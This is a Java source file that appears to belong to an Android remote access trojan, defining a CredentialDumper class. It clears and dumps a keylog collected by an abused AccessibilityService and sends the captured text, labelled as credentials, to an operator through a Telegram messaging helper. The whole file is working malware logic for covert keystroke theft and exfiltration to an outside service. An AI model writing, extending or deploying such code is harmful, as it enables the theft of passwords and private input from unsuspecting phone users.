package com.enterprise.rat.commands;

import android.content.Context;
import com.enterprise.rat.services.AccessibilityService;
import com.enterprise.rat.utils.TelegramApi;

public class CredentialDumper {
    private Context context;
    public CredentialDumper(Context context) { this.context = context; }

    public void startCredentialHarvest() {
        AccessibilityService service = AccessibilityService.getInstance();
        if (service != null) { service.clearKeylog(); TelegramApi.sendMessage("🔑 Credential harvesting started."); }
        else TelegramApi.sendMessage("❌ Accessibility Service not active.");
    }

    public void dumpCredentials() {
        AccessibilityService service = AccessibilityService.getInstance();
        if (service != null) {
            String logs = service.dumpKeylog();
            TelegramApi.sendMessage(logs.isEmpty() ? "🔑 No credentials yet." : "<b>🔑 Credentials:</b>\n<code>" + logs + "</code>");
        } else TelegramApi.sendMessage("❌ Accessibility Service not active.");
    }
}
